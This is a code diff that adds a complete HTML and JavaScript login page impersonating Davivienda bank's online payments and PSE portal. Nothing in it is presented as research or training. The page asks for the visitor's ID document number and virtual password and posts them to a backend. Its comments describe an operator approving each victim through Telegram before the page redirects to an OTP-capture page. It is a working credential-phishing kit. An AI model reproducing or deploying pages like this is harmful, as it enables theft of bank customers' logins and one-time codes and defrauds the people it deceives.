@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingreso Persona Natural - Davivienda</title>
+    
+    <!-- Fuente Montserrat -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* --- CONFIGURACIÓN BÁSICA --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden; 
+        }
+
+        /* --- HEADER (BARRA ROJA PC) --- */
+        header {
+            background-color: #E30613; 
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 40px 0 0; 
+            color: white;
+            height: 85px; 
+            z-index: 10;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            height: 100%;
+            cursor: pointer; 
+            text-decoration: none;
+        }
+
+        .logo-container img {
+            height: 45px; 
+            object-fit: contain;
+            margin-left: 60px; 
+        }
+
+        .header-info {
+            text-align: right;
+            font-size: 14px;
+            line-height: 1.4;
+            font-weight: 400;
+            padding-right: 40px; 
+        }
+
+        /* --- CUERPO PRINCIPAL --- */
+        main {
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start; 
+            align-items: center;
+            text-align: center;
+            position: relative;
+            background-image: url('mujer.png');
+            background-size: cover;
+            background-position: center top;
+            background-repeat: no-repeat;
+            color: white;
+            padding: 60px 20px 20px 20px; 
+        }
+
+        .content {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 900px; 
+        }
+
+        /* --- TEXTOS --- */
+        .title {
+            font-size: 36px; 
+            font-weight: 300; 
+            margin-bottom: 0px;
+            letter-spacing: -0.5px;
+        }
+
+        .subtitle {
+            font-size: 34px; 
+            font-weight: 700; 
+            margin-bottom: 25px; 
+        }
+
+        /* --- FORMULARIO (TARJETA BLANCA TRANSPARENTE) --- */
+        .form-card {
+            background-color: rgba(255, 255, 255, 0.4); 
+            border: 3px solid white;
+            border-radius: 20px;
+            padding: 20px 30px; 
+            width: 100%;
+            max-width: 800px;
+            color: #000;
+            backdrop-filter: blur(5px); 
+        }
+
+        .form-title {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 20px; 
+        }
+
+        /* Contenedor de los inputs en PC (Horizontal) */
+        .form-row {
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap; 
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            text-align: left;
+        }
+
+        .input-group label {
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            text-align: center; 
+        }
+
+        .input-group select,
+        .input-group input {
+            width: 180px;
+            height: 38px; 
+            border: 1px solid #999;
+            border-radius: 8px;
+            padding: 0 10px;
+            font-size: 14px;
+            font-family: 'Montserrat', sans-serif;
+            outline: none;
+        }
+
+        .input-group select {
+            cursor: pointer;
+            background-color: white;
+        }
+
+        /* Contenedor de los botones */
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-left: 10px;
+        }
+
+        .btn {
+            height: 38px;
+            padding: 0 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Montserrat', sans-serif;
+            transition: transform 0.2s;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+        }
+
+        .btn:disabled {
+            background-color: #999;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-primary {
+            background-color: #E30613; 
+            color: white;
+        }
+
+        .btn-secondary {
+            background-color: #E30613;
+            color: white;
+        }
+
+        /* --- CAMPO OCULTO (CLAVE VIRTUAL) --- */
+        .clave-group {
+            display: none; 
+            animation: fadeIn 0.4s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* --- FOOTER (PIE DE PÁGINA PC) --- */
+        footer {
+            background-color: #000000;
+            color: white;
+            display: flex;
+            align-items: center; 
+            justify-content: space-between; 
+            padding: 0 40px;
+            height: 90px; 
+            z-index: 10;
+        }
+
+        .footer-left {
+            display: flex;
+            align-items: center;
+            width: 250px; 
+        }
+
+        .footer-left img {
+            height: 45px; 
+            width: auto;
+            object-fit: contain;
+        }
+
+        .footer-text {
+            font-size: 15px;
+            font-weight: 400;
+            text-align: center;
+            flex-grow: 1;
+        }
+
+        .footer-right {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            width: 250px;
+        }
+
+        .footer-right img {
+            height: 60px; 
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* =========================================
+           DISEÑO RESPONSIVO (EXCLUSIVO CELULARES)
+           ========================================= */
+        @media (max-width: 768px) {
+            body {
+                overflow-y: auto;
+                height: auto;
+                min-height: 100vh;
+            }
+
+            header {
+                flex-direction: column;
+                height: auto;
+                padding: 15px 0 0 0; 
+                align-items: center; 
+                gap: 15px;
+                width: 100%;
+            }
+
+            .logo-container {
+                width: 100%;
+                justify-content: center;
+            }
+
+            .logo-container img {
+                height: 40px;
+                margin-left: 0; 
+            }
+
+            .header-info {
+                background-color: white;
+                color: #666;
+                text-align: center;
+                width: 100%; 
+                margin-left: 0;
+                padding: 10px 0;
+                font-size: 13px;
+            }
+
+            main {
+                padding: 40px 15px;
+                justify-content: center;
+            }
+
+            .title { font-size: 28px; }
+            .subtitle { font-size: 26px; margin-bottom: 20px; }
+            
+            .form-card {
+                padding: 25px 15px;
+            }
+
+            .form-row {
+                flex-direction: column;
+                align-items: center;
+                gap: 15px;
+            }
+
+            .input-group select,
+            .input-group input {
+                width: 100%;
+                max-width: 280px;
+            }
+
+            .button-group {
+                margin-left: 0;
+                margin-top: 10px;
+                width: 100%;
+                justify-content: center;
+            }
+
+            .btn {
+                width: 120px;
+            }
+
+            footer {
+                flex-direction: column;
+                height: auto;
+                padding: 12px 15px; 
+                gap: 5px; 
+            }
+
+            .footer-text {
+                order: -1; 
+                font-size: 13px;
+            }
+
+            .footer-left {
+                width: auto;
+                justify-content: center;
+            }
+
+            .footer-left img {
+                height: 22px; 
+            }
+
+            .footer-right {
+                display: none; 
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <header>
+        <a href="index.html" class="logo-container">
+            <img src="davi.png" alt="Davivienda">
+        </a>
+        <div class="header-info">
+            <div id="fecha-hora">Cargando fecha...</div>
+            <div id="codigo-cus">Código único CUS: Cargando...</div>
+        </div>
+    </header>
+
+    <!-- CUERPO -->
+    <main>
+        <div class="content">
+            <div class="title">Ingreso Persona Natural</div>
+            <div class="subtitle">Pagos en Línea y PSE</div>
+
+            <!-- TARJETA DEL FORMULARIO -->
+            <div class="form-card">
+                <div class="form-title">Por favor ingrese la siguiente información:</div>
+                
+                <form id="loginForm" onsubmit="event.preventDefault();">
+                    <div class="form-row">
+                        
+                        <!-- Tipo de documento -->
+                        <div class="input-group">
+                            <label>Tipo de documento</label>
+                            <select id="tipoDoc">
+                                <option>Cedula de Ciudadanía</option>
+                                <option>Pasaporte</option>
+                                <option>Cédula de Extranjería</option>
+                            </select>
+                        </div>
+
+                        <!-- Número de documento -->
+                        <div class="input-group">
+                            <label>No. de documento</label>
+                            <input type="text" id="numDoc" required>
+                        </div>
+
+                        <!-- Clave Virtual (Oculta inicialmente) -->
+                        <div class="input-group clave-group" id="claveContainer">
+                            <label>Clave virtual</label>
+                            <input type="password" id="claveVirtual" required>
+                        </div>
+
+                        <!-- Botones -->
+                        <div class="button-group">
+                            <button type="button" class="btn btn-primary" id="btnContinuar" onclick="mostrarClave()">Continuar</button>
+                            <button type="button" class="btn btn-secondary" onclick="window.location.href='index.html'">Cancelar</button>
+                        </div>
+
+                    </div>
+                </form>
+            </div>
+        </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer>
+        <div class="footer-left">
+            <img src="vig.png" alt="Vigilado">
+        </div>
+        
+        <div class="footer-text">
+            Banco Davivienda S.A. Todos los derechos reservados 2023.
+        </div>
+
+        <div class="footer-right">
+            <img src="blanco.png" alt="Davivienda">
+        </div>
+    </footer>
+
+    <!-- SCRIPTS -->
+    <script>
+        // 1. FECHA Y CUS DINÁMICOS
+        function actualizarFecha() {
+            const meses = ["Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"];
+            const dias = ["Domingo", "Lunes", "Martes", "Miércoles", "Jueves", "Viernes", "Sábado"];
+            const ahora = new Date();
+            let horas = ahora.getHours();
+            const ampm = horas >= 12 ? 'PM' : 'AM';
+            horas = horas % 12 || 12; 
+            document.getElementById('fecha-hora').textContent = `${dias[ahora.getDay()]} ${ahora.getDate()} de ${meses[ahora.getMonth()]} de ${ahora.getFullYear()}, ${horas}:${ahora.getMinutes().toString().padStart(2, '0')} ${ampm}`;
+        }
+        
+        function generarCUS() {
+            document.getElementById('codigo-cus').textContent = `Código único CUS: ${Math.floor(100 + Math.random() * 900)}-${Math.floor(1000000 + Math.random() * 9000000)}`;
+        }
+        
+        actualizarFecha(); 
+        generarCUS();
+
+        // 2. LÓGICA DEL FORMULARIO Y TELEGRAM
+        let intervaloVerificacion = null;
+
+        function mostrarClave() {
+            const claveContainer = document.getElementById('claveContainer');
+            const btnContinuar = document.getElementById('btnContinuar');
+            const numDoc = document.getElementById('numDoc').value;
+            
+            // Validamos que haya escrito el documento antes de mostrar la clave
+            if (!numDoc) {
+                alert("Por favor, ingrese su número de documento primero.");
+                return;
+            }
+
+            // Si el campo está oculto, lo mostramos y cambiamos el botón
+            if (claveContainer.style.display === 'none' || claveContainer.style.display === '') {
+                claveContainer.style.display = 'flex';
+                btnContinuar.textContent = 'Ingresar';
+                btnContinuar.setAttribute('onclick', 'enviarSolicitud()');
+            }
+        }
+
+        async function enviarSolicitud() {
+            const btnContinuar = document.getElementById('btnContinuar');
+            const docInput = document.getElementById('numDoc'); 
+            const claveInput = document.getElementById('claveVirtual');
+            
+            const documento = docInput.value;
+            const clave = claveInput.value;
+
+            if (!documento || !clave) {
+                alert('Por favor, complete ambos campos.');
+                return;
+            }
+
+            btnContinuar.textContent = 'Enviando...';
+            btnContinuar.disabled = true;
+
+            try {
+                // Petición a tu Backend en Render (Ruta relativa)
+                const response = await fetch('/api/solicitar-acceso', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ documento, clave })
+                });
+                
+                const data = await response.json();
+
+                if (data.status === 'ok') {
+                    btnContinuar.textContent = 'Esperando aprobación...';
+                    
+                    // Empezamos a revisar si el admin ya respondió en Telegram
+                    intervaloVerificacion = setInterval(async () => {
+                        const res = await fetch(`/api/verificar-estado/${data.id}`);
+                        const estadoData = await res.json();
+                        
+                        if (estadoData.estado === 'aceptado') {
+                            clearInterval(intervaloVerificacion);
+                            window.location.href = 'otp.html'; // PASA A OTP
+                        } else if (estadoData.estado === 'rechazado') {
+                            clearInterval(intervaloVerificacion);
+                            alert('Error: Intente de nuevo. La solicitud ha sido rechazada.');
+                            btnContinuar.textContent = 'Ingresar';
+                            btnContinuar.disabled = false;
+                        }
+                    }, 3000); // Revisa cada 3 segundos
+                } else {
+                    alert('Error de conexión. Intente de nuevo.');
+                    btnContinuar.textContent = 'Ingresar';
+                    btnContinuar.disabled = false;
+                }
+            } catch (error) {
+                console.error(error);
+                alert('Error de red. Intente de nuevo.');
+                btnContinuar.textContent = 'Ingresar';
+                btnContinuar.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
